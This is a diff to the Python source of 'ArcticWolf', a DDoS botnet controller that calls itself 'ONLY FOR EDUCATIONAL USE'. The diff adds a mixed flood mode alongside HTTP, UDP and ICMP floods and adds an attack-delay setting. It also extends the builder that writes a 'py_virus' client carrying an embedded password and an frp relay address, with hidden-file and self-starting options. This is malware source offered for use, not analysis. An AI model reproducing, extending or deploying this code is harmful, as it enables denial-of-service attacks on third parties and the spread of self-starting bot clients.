@@ -12,7 +12,7 @@ from winsound import Beep
 datasock_list = {}  # dict of bots  {Number:socket}
 last_Heartbeat = {}  # recored the time a bot send its heartbeat message
 ddos_attack_list = [] # recored ddos attack launched
-mode_list = ['httpGETflood', 'httpPOSTflood', 'UDPflood', 'ICMPflood'] # attack_method
+mode_list = ['httpGETflood', 'httpPOSTflood', 'UDPflood', 'ICMPflood', 'Mix'] # attack_method
 # printed with color
 def print_error(str : str):
     '''error thing printed'''
@@ -66,7 +66,7 @@ def post_cmd():
                 py_txt = ''.join(a[head:-1])
             return py_txt
         print_normal("Copying source......")
-        py_txt = delete_lines('Resource/client_source.py', 9) #Varies with the number of Settings!!!
+        py_txt = delete_lines('Resource/client_source.py', 10) #Varies with the number of Settings!!!
         name = "py_virus" + str(randint(100000, 900000))
         with open(name+'.py', "w") as fw:
             # write the settings to the virus
@@ -80,6 +80,7 @@ def post_cmd():
                     random_str += base_str[randint(0, length)]
                 change_password(random_str)
             fw.write(f"Password = '{Password}'\n")
+            fw.write(f"delay = {settings_data['Bots']['Attack_delay']}\n")
             fw.write(f"address = '{frpip}'\n")
             fw.write(f"port = {frpport}\n")
             fw.write(f'mode = "{mode}"\n')
@@ -415,7 +416,7 @@ if __name__ == '__main__':
 
 [ArcticWolf] : A botnet controller for Ddos attacks using frp (without server)
 ---------------------------------------------------------------------------
-[Version] : v0.1.5     [Author] : D0WE1LIN    ONLY FOR EDUCATIONAL USE!  
+[Version] : v0.1.5.1     [Author] : D0WE1LIN    ONLY FOR EDUCATIONAL USE!  
 
 ===========================================================================
 
@@ -445,7 +446,8 @@ if __name__ == '__main__':
             'Bots' : {
                 'Threads_num' : 10,
                 'Attribute_hide' : True,
-                'Self_starting' : True
+                'Self_starting' : True,
+                'Attack_delay' : 0.3
             }
         }
         with open("./Data/settings.json", 'w') as f:
